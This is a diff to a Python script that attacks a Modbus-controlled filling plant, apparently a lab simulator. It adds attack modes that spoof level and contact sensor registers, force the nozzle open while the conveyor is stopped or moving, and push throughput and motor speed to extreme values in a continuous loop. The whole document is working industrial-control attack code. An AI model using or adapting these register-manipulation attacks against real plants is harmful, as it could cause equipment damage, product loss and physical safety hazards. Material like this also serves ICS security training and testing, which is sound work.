@@ -9,7 +9,8 @@ from modbus import (
     REG_RUN,
     REG_LEVEL,
     REG_CONTACT,
-    REG_MOTOR,
+    REG_MOTOR_EN,
+    REG_MOTOR_SPEED,
     REG_NOZZLE,
     REG_THROUGHPUT,
     REG_COLOR,
@@ -27,6 +28,7 @@ parser = argparse.ArgumentParser(
             - 2 : Move and fill
             - 3 : Max throughput
             - 4 : Color
+            - 5 : Max Speed
         '''))
 parser.add_argument("-i", "--ip", required=False, help="IP", default="127.0.0.1")
 parser.add_argument("-p", "--port", type=int, required=False, help="Port", default=MODBUS_PORT)
@@ -52,9 +54,28 @@ try:
     client.connect()
 
     while True:
+
         client.write(REG_RUN, 1) 	    # Run Plant, Run!
-        if ( args.attack == 3 ):
+
+        # Stop and fill
+        if ( args.attack == 1 ):
+            client.write(REG_LEVEL, 0) 	    
+            client.write(REG_MOTOR_EN, 0) 	
+            client.write(REG_NOZZLE, 1) 	
+            client.write(REG_CONTACT, 0) 	
+
+        # Move and fill
+        elif ( args.attack == 2 ):
+            client.write(REG_LEVEL, 0) 	    
+            client.write(REG_MOTOR_EN, 1) 	
+            client.write(REG_NOZZLE, 1) 	
+            client.write(REG_CONTACT, 0) 	
+
+        # Max Throughput
+        elif ( args.attack == 3 ):
             client.write(REG_THROUGHPUT, 20)
+
+        # Color mix
         elif ( args.attack == 4):
             nozzle = client.read(REG_NOZZLE)
             if ( nozzle ):
@@ -62,11 +83,11 @@ try:
                 client.write(REG_NOZZLE, 0)
                 time.sleep(period)
                 client.write(REG_NOZZLE, 1)
-        else:
-            client.write(REG_LEVEL, level) 	    # Level Sensor
-            client.write(REG_MOTOR, motor) 	    # Level Sensor
-            client.write(REG_NOZZLE, nozzle) 	    # Level Sensor
-            client.write(REG_CONTACT, contact) 	# Contact Sensor
+
+        # Max speed
+        elif ( args.attack == 5):
+            client.write(REG_MOTOR_SPEED, 11)
+
         time.sleep(period)
 
 except KeyboardInterrupt:
